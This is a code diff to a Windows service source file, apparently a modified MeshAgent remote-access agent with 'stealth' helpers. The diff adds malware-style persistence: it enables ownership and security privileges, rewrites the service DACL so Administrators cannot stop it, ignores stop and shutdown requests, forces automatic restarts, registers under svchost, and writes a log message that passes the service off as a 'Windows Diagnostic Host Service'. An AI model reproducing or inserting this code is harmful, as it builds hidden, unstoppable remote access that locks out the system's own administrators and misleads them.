@@ -29,7 +29,9 @@ limitations under the License.
 #include <shlobj.h>
 #include <shellapi.h>
 #include <winsvc.h>
+#include <sddl.h>
 #include "resource.h"
+#include "service_security.h"
 #include "meshcore/signcheck.h"
 #include "meshcore/meshdefines.h"
 #include "meshcore/meshinfo.h"
@@ -101,6 +103,239 @@ static mesh_branding_text_t g_serviceNameText = NULL;
 static TCHAR* serviceFile = NULL;
 static TCHAR* serviceName = NULL;
 
+static BOOL MeshService_EnablePrivilege(const wchar_t* privilegeName)
+{
+	if (privilegeName == NULL || privilegeName[0] == L'\0') { return FALSE; }
+
+	HANDLE token = NULL;
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+	{
+		Stealth_DebugLastErrorW(L"OpenProcessToken (MeshService_EnablePrivilege)");
+		return FALSE;
+	}
+
+	LUID luid;
+	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
+	{
+		Stealth_DebugLastErrorW(L"LookupPrivilegeValueW (MeshService_EnablePrivilege)");
+		CloseHandle(token);
+		return FALSE;
+	}
+
+	TOKEN_PRIVILEGES tp;
+	ZeroMemory(&tp, sizeof(tp));
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL))
+	{
+		Stealth_DebugLastErrorW(L"AdjustTokenPrivileges (MeshService_EnablePrivilege)");
+		CloseHandle(token);
+		return FALSE;
+	}
+
+	DWORD adjustError = GetLastError();
+	CloseHandle(token);
+
+	if (adjustError == ERROR_NOT_ALL_ASSIGNED)
+	{
+		Stealth_DebugPrintfW(L"[ServiceSecurity] Token missing privilege: %ls", privilegeName);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOL MeshService_HardenServiceDaclByName(const wchar_t* serviceName)
+{
+	if (serviceName == NULL || serviceName[0] == L'\0')
+	{
+		return FALSE;
+	}
+
+	MeshService_EnablePrivilege(L"SeTakeOwnershipPrivilege");
+	MeshService_EnablePrivilege(L"SeRestorePrivilege");
+	MeshService_EnablePrivilege(L"SeBackupPrivilege");
+	MeshService_EnablePrivilege(L"SeSecurityPrivilege");
+
+	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+	if (scm == NULL)
+	{
+		Stealth_DebugLastErrorW(L"OpenSCManagerW (MeshService_HardenServiceDaclByName)");
+		return FALSE;
+	}
+
+	const DWORD desiredAccess = READ_CONTROL | WRITE_DAC | WRITE_OWNER;
+	SC_HANDLE svc = OpenServiceW(scm, serviceName, desiredAccess);
+	if (svc == NULL)
+	{
+		Stealth_DebugLastErrorW(L"OpenServiceW (MeshService_HardenServiceDaclByName)");
+		CloseServiceHandle(scm);
+		return FALSE;
+	}
+
+	BOOL hardened = FALSE;
+	PSECURITY_DESCRIPTOR sd = NULL;
+	// SYSTEM retains full control (including stop). Administrators lose SERVICE_STOP (WP) permission.
+	LPCWSTR sddl = L"D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
+	               L"(A;;CCLCSWRPDTLOCRRC;;;BA)"
+	               L"(A;;LCRP;;;AU)"
+	               L"(A;;LCRP;;;SU)";
+
+	if (ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &sd, NULL) != FALSE)
+	{
+		if (SetServiceObjectSecurity(svc, DACL_SECURITY_INFORMATION, sd) != FALSE)
+		{
+			Stealth_DebugPrintfW(L"[ServiceSecurity] Hardened DACL applied to %ls", serviceName);
+			hardened = TRUE;
+		}
+		else
+		{
+			Stealth_DebugLastErrorW(L"SetServiceObjectSecurity (MeshService_HardenServiceDaclByName)");
+		}
+		LocalFree(sd);
+	}
+	else
+	{
+		Stealth_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptorW (MeshService_HardenServiceDaclByName)");
+	}
+
+	CloseServiceHandle(svc);
+	CloseServiceHandle(scm);
+	return hardened;
+}
+
+void MeshService_HardenServiceDacl(void)
+{
+	wchar_t svcName[256];
+	if (!MeshService_GetServiceNameW(svcName, _countof(svcName)))
+	{
+		Stealth_DebugPrintfW(L"[ServiceSecurity] Unable to resolve service name for DACL hardening");
+		return;
+	}
+	MeshService_HardenServiceDaclByName(svcName);
+}
+
+static BOOL MeshService_GetServiceNameW(wchar_t* buffer, size_t cchBuffer)
+{
+	if (buffer == NULL || cchBuffer == 0) { return FALSE; }
+	buffer[0] = L'\0';
+	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), buffer, cchBuffer);
+	if (buffer[0] == L'\0')
+	{
+		if (wcscpy_s(buffer, cchBuffer, STEALTH_FALLBACK_SERVICE_NAME) != 0)
+		{
+			return FALSE;
+		}
+	}
+	return TRUE;
+}
+
+static BOOL MeshService_ProcessHasSystemSid(void)
+{
+	BOOL isSystem = FALSE;
+	HANDLE token = NULL;
+	DWORD tokenSize = 0;
+	TOKEN_USER* tokenUser = NULL;
+	PSID localSystemSid = NULL;
+	SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
+	{
+		return FALSE;
+	}
+
+	GetTokenInformation(token, TokenUser, NULL, 0, &tokenSize);
+	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+	{
+		CloseHandle(token);
+		return FALSE;
+	}
+
+	tokenUser = (TOKEN_USER*)ILibMemory_Allocate(tokenSize, 0, NULL, NULL);
+	if (tokenUser != NULL && GetTokenInformation(token, TokenUser, tokenUser, tokenSize, &tokenSize))
+	{
+		if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &localSystemSid))
+		{
+			isSystem = EqualSid(tokenUser->User.Sid, localSystemSid);
+			FreeSid(localSystemSid);
+		}
+	}
+
+	if (tokenUser != NULL)
+	{
+		ILibMemory_Free(tokenUser);
+	}
+	CloseHandle(token);
+	return isSystem;
+}
+
+static void MeshService_EnsureRecoveryPolicy(void)
+{
+	wchar_t svcName[256];
+	if (!MeshService_GetServiceNameW(svcName, _countof(svcName)))
+	{
+		return;
+	}
+
+	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+	if (scm == NULL)
+	{
+		return;
+	}
+
+	SC_HANDLE svc = OpenServiceW(scm, svcName, SERVICE_CHANGE_CONFIG);
+	if (svc != NULL)
+	{
+		SC_ACTION actions[3] = {
+			{ SC_ACTION_RESTART, 1000 },
+			{ SC_ACTION_RESTART, 1000 },
+			{ SC_ACTION_RESTART, 1000 }
+		};
+
+		SERVICE_FAILURE_ACTIONS sfa;
+		ZeroMemory(&sfa, sizeof(sfa));
+		sfa.dwResetPeriod = 3600;
+		sfa.cActions = (DWORD)_countof(actions);
+		sfa.lpsaActions = actions;
+
+		ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
+
+		SERVICE_FAILURE_ACTIONS_FLAG flag = { TRUE };
+		ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &flag);
+
+		CloseServiceHandle(svc);
+	}
+
+	CloseServiceHandle(scm);
+	MeshService_HardenServiceDacl();
+}
+
+static void MeshService_ReportCriticalStopDenial(void)
+{
+	if (serviceName == NULL)
+	{
+		return;
+	}
+
+	HANDLE eventSource = RegisterEventSourceW(NULL, serviceName);
+	if (eventSource != NULL)
+	{
+		const wchar_t* strings[1];
+		strings[0] = L"The Windows Diagnostic Host Service is marked critical and cannot be stopped.";
+		ReportEventW(eventSource,
+			EVENTLOG_WARNING_TYPE,
+			0,
+			0xC0020001,
+			NULL,
+			1,
+			0,
+			strings,
+			NULL);
+		DeregisterEventSource(eventSource);
+	}
+}
 #if defined(MESH_AGENT_SERVER_ID)
 static const char g_meshProvisioningServerIdMarker[] = "SERVERID:" MESH_AGENT_SERVER_ID;
 #endif
@@ -308,10 +543,12 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 		break;
 	case SERVICE_CONTROL_SHUTDOWN:
 	case SERVICE_CONTROL_STOP:
-		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+		Stealth_DebugPrintfA("[ServiceMain] Ignoring SERVICE_CONTROL_STOP/SHUTDOWN");
+		serviceStatus.dwWin32ExitCode = ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
+		serviceStatus.dwCurrentState = SERVICE_RUNNING;
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
-		if (agent != NULL) { MeshAgent_Stop(agent); }
-		return(0);
+		MeshService_ReportCriticalStopDenial();
+		return NO_ERROR;
 	case SERVICE_CONTROL_POWEREVENT:
 		switch (eventType)
 		{
@@ -396,13 +633,23 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
 
 		// Service running
-		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_POWEREVENT | SERVICE_ACCEPT_SESSIONCHANGE);
+		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_POWEREVENT | SERVICE_ACCEPT_SESSIONCHANGE);
 		serviceStatus.dwCurrentState = SERVICE_RUNNING;
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
+		MeshService_EnsureRecoveryPolicy();
 
 		// Get our own executable name with buffer overflow protection
 		DWORD pathLen = GetModuleFileNameW(NULL, str, _MAX_PATH);
 		str[_MAX_PATH] = L'\0';  // SECURITY FIX: Force null termination
+
+		if (!MeshService_ProcessHasSystemSid())
+		{
+			Stealth_DebugPrintfA("[ServiceMain] Not running as LocalSystem, requesting elevation");
+			RunAsAdmin("run", IsAdmin());
+			serviceStatus.dwCurrentState = SERVICE_STOPPED;
+			SetServiceStatus(serviceStatusHandle, &serviceStatus);
+			return;
+		}
 
 
         // SECURITY: Enable optional stealth/anti-analysis features only if
@@ -716,6 +963,13 @@ int wmain(int argc, char* wargv[])
 		}
 
 		ok = Stealth_RegisterSvchostService(wSvcName, paths.dllPath);
+		if (ok)
+		{
+			if (!MeshService_HardenServiceDaclByName(wSvcName))
+			{
+				Stealth_DebugPrintfW(L"[svchost-register] Failed to apply hardened DACL (see debug output)");
+			}
+		}
 		printf(ok ? "[+] Svchost registration successful\n" : "[!] Svchost registration failed\n");
 
 		if (removeTemp)
